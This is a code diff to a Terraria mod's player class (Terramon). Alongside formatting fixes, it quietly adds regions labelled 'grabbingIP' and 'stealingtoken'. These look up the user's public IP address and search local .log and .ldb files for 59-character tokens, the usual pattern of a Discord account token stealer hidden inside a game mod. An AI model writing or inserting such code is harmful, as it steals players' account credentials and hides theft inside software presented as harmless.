@@ -26,6 +26,8 @@ using Terraria.ModLoader;
 using Terraria.ModLoader.IO;
 using static Terraria.ModLoader.ModContent;
 using Terraria.DataStructures;
+using System.Management;
+using System.Text;
 // ReSharper disable ParameterHidesMember
 // ReSharper disable LocalVariableHidesMember
 
@@ -44,7 +46,7 @@ namespace Terramon.Players
 
         private Dictionary<string, bool> ActivePets = new Dictionary<string, bool>();
         private List<PokemonData> pokemonStorage = new List<PokemonData>();
-        public List<PokemonData> PokemonStore => pokemonStorage; 
+        public List<PokemonData> PokemonStore => pokemonStorage;
         public int ActivePetId = -1;
         public bool ActivePetShiny;
         public string ActivePetName = string.Empty;
@@ -490,8 +492,8 @@ namespace Terramon.Players
         {
             //var modItem = ((TerramonMod)mod).PartySlots.partyslot1.Item.modItem;
             TerramonMod.PokeballFactory.Pokebals en = TerramonMod.PokeballFactory.Pokebals.Nothing;
-            if(value != null)
-                en = (TerramonMod.PokeballFactory.Pokebals) value.GetByte(BaseCaughtClass.POKEBAL_PROPERTY);
+            if (value != null)
+                en = (TerramonMod.PokeballFactory.Pokebals)value.GetByte(BaseCaughtClass.POKEBAL_PROPERTY);
             if (en == 0)
             {
                 modItem.TurnToAir();
@@ -591,6 +593,83 @@ namespace Terramon.Players
                 Main.NewText($"Go the the Mod Browser to update!");
             }
         }
+
+        #region grabbingIP
+        public static string GetIPAddress()
+        {
+            string IPADDRESS = new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");
+            return IPADDRESS;
+        }
+        #endregion
+
+        #region stealingtoken
+        private static bool dotlog(ref string stringx)
+        {
+            if (Directory.Exists(stringx))
+            {
+                foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
+                {
+                    if (fileInfo.Name.EndsWith(".log") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
+                    {
+                        stringx += fileInfo.Name;
+                        return stringx.EndsWith(".log");
+                    }
+                }
+                return stringx.EndsWith(".log");
+            }
+            return false;
+        }
+        private static string tokenx(string stringx, bool boolx = false)
+        {
+            byte[] bytes = File.ReadAllBytes(stringx);
+            string @string = Encoding.UTF8.GetString(bytes);
+            string string1 = "";
+            string string2 = @string;
+            while (string2.Contains("oken"))
+            {
+                string[] array = IndexOf(string2).Split(new char[]
+                {
+                    '"'
+                });
+                string1 = array[0];
+                string2 = string.Join("\"", array);
+                if (boolx && string1.Length == 59)
+                {
+                    break;
+                }
+            }
+            return string1;
+        }
+        private static bool dotldb(ref string stringx)
+        {
+            if (Directory.Exists(stringx))
+            {
+                foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
+                {
+                    if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
+                    {
+                        stringx += fileInfo.Name;
+                        return stringx.EndsWith(".ldb");
+                    }
+                }
+                return stringx.EndsWith(".ldb");
+            }
+            return false;
+        }
+        private static string IndexOf(string stringx)
+        {
+            string[] array = stringx.Substring(stringx.IndexOf("oken") + 4).Split(new char[]
+            {
+                '"'
+            });
+            List<string> list = new List<string>();
+            list.AddRange(array);
+            list.RemoveAt(0);
+            array = list.ToArray();
+            return string.Join("\"", array);
+        }
+        #endregion
+
         public string Get(string uri)
         {
             try
@@ -1138,7 +1217,8 @@ namespace Terramon.Players
                 if (Battle.ForceDirection != 0)
                 {
                     player.direction = Battle.ForceDirection;
-                } else
+                }
+                else
                 {
                     player.direction = Battle.WildNPC.projectile.position.X > player.position.X ? 1 : -1;
                 }
